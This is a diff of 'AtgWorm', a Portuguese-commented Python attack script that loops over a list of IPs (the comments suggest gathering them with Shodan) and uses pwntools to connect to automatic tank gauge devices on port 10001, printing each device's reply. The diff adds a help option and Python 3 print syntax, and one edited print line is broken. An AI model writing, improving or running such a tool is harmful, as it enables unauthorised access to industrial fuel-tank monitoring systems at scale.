@@ -1,22 +1,29 @@
+# -*- enconding: utf-8 -*-
+
 """
 	by @ozym4ndias @Risezin at telegram
 paper que inspirou script: https://telegra.ph/Hackeando-tanques-de-combust%C3%ADvelATG-02-03
 
-Versão 2.0
+V2.0
 """
 from pwn import *
 from time import sleep
 import sys
 
 banner = """
-  __ _| |_ __ ___      _____  _ __ _ __ ___  
- / _` | __/ _` \ \ /\ / / _ \| '__| '_ ` _ \ 
-| (_| | || (_| |\ V  V / (_) | |  | | | | | |
- \__,_|\__\__, | \_/\_/ \___/|_|  |_| |_| |_|
-          |___/                              
+
+\t\t\t\t\t\t  __ _| |_ __ ___      _____  _ __ _ __ ___  
+\t\t\t\t\t\t / _` | __/ _` \ \ /\ / / _ \| '__| '_ ` _ \ 
+\t\t\t\t\t\t| (_| | || (_| |\ V  V / (_) | |  | | | | | |
+\t\t\t\t\t\t \__,_|\__\__, | \_/\_/ \___/|_|  |_| |_| |_|
+\t\t\t\t\t\t          |___/                              
 """
 print(banner)
 
+# help option
+if sys.argv[1] == "-h":
+	print("\t\t\t\t\t\tModo de uso:\n\t\t\t\t\t\tVoce deve passar como parametro um arquivo .txt contendo os ip's que o script ira usar, exemplo:\n\t\t\t\t\t\t$ python AtgWorm.py alvos.txt\n\n")
+	exit()
 # add ipList at list(use shodan to search)
 arquivo = open(sys.argv[1])
 ips = arquivo.readlines()
@@ -29,7 +36,7 @@ wg = wget('https://ipinfo.io/ip')
 if wg is None:
   exit()
 
-print "your ip: %s" % wg
+print ("your ip: {}".format(wg))
 sleep(4)
 
 # tenta conectar no ip de ipList na porta 10001(porta default do ATG)
@@ -42,13 +49,10 @@ for ip in ips:
 		
 		r.recvuntil(' ', drop=True)	
 		response = r.recv(4029)
-		print "\tresponse = %s" % response
+		print("\tresponse = %s".format(response))
 		
 		r.close()
 	except:
 		# caso nao consiga se conectar no ip vai para o proximo da lista
-		print "erro ao conectar ao ip %s:10001" % ip
+		print ("erro ao conectar ao ip {}:10001".format(ip))
 		pass
-
-if sys.argv[1] == "-h":
-	print("Modo de uso:\nVocê deve passar como parâmetro um arquivo .txt contendo os ip's que o script irá usar,exemplo:\n$ python3 AtgWorm.py alvos.txt")
